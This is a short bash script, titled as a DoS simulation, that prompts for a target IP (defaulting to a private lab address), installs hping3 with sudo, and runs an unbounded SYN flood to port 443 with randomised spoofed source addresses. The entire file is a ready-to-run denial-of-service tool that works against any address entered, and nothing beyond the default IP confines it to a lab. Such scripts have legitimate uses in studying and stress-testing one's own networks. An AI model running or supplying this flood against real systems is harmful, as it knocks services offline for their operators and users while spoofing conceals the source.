#!/bin/bash
echo "💣 Simulate DoS Attack (hping3 with random spoofed IPs)"

read -rp "Enter target IP (e.g. 192.168.0.19): " TARGET
TARGET=${TARGET:-192.168.0.19}

# Get attacker machine’s actual IP (for info only)
ATTACKER_IP=$(hostname -I | awk '{print $1}')
echo "ℹ️ Your actual machine IP is $ATTACKER_IP (will NOT be used in spoofed attack)."

echo "📦 Installing hping3 if not present..."
sudo apt-get update && sudo apt-get install -y hping3

echo "🚀 Launching spoofed SYN flood to $TARGET:443 ..."
echo "⏳ Press Ctrl+C to stop."

sudo hping3 "$TARGET" -q -n -d 120 -S -p 443 --flood --rand-source
